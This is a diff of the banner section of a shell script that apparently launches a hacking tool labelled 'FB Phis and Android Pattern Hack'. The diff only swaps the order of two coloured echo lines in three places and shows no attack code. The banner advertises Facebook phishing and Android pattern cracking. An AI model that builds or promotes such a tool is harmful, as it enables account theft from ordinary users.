@@ -3,8 +3,8 @@ clear
 toilet -f mono12 -F gay "SDMH"
 echo ""
 echo -e "\e[96m----------------- SDMH-Hacking-TV 2021--------\e[0m";
-echo -e "\e[95m----------- FB Phis and Android Pattern Hack ---------------\e[0m";
-echo -e "\e[93m-------------- Facebook - SDMH-Hacking-TV -----------\e[0m";
+echo -e "\e[95m--------------- Facebook-SDMH-Hacking-TV ----------\e[0m";
+echo -e "\e[93m----------- FB Phis and Android Pattern Hack ------\e[0m";
 echo ""
 echo ""
 echo CODED BY ISURUWA | lolcat -a
@@ -87,8 +87,8 @@ sleep 1
 toilet -f mono12 -F gay "SDMH"
 echo ""
 echo -e "\e[96m----------------- SDMH-Hacking-TV 2021--------\e[0m";
-echo -e "\e[95m----------- FB Phis and Android Pattern Hack ----------\e[0m";
-echo -e "\e[93m-------------- Facebook - SDMH-Hacking-TV ------\e[0m";
+echo -e "\e[95m--------------- Facebook-SDMH-Hacking-TV ----------\e[0m";
+echo -e "\e[93m----------- FB Phis and Android Pattern Hack ------\e[0m";
 echo ""
 echo ""
 echo  CODED BY ISURUWA | lolcat -a
@@ -104,8 +104,8 @@ clear
 toilet -f mono12 -F gay "SDMH"
 echo ""
 echo -e "\e[96m----------------- SDMH-Hacking-TV 2021--------\e[0m";
-echo -e "\e[95m----------- FB Phis and Android Pattern Hack ----------\e[0m";
-echo -e "\e[93m-------------- Facebook - SDMH-Hacking-TV ------\e[0m";
+echo -e "\e[95m--------------- Facebook-SDMH-Hacking-TV ----------\e[0m";
+echo -e "\e[93m----------- FB Phis and Android Pattern Hack ------\e[0m";
 echo ""
 echo ""
 echo  CODED BY ISURUWA | lolcat -a
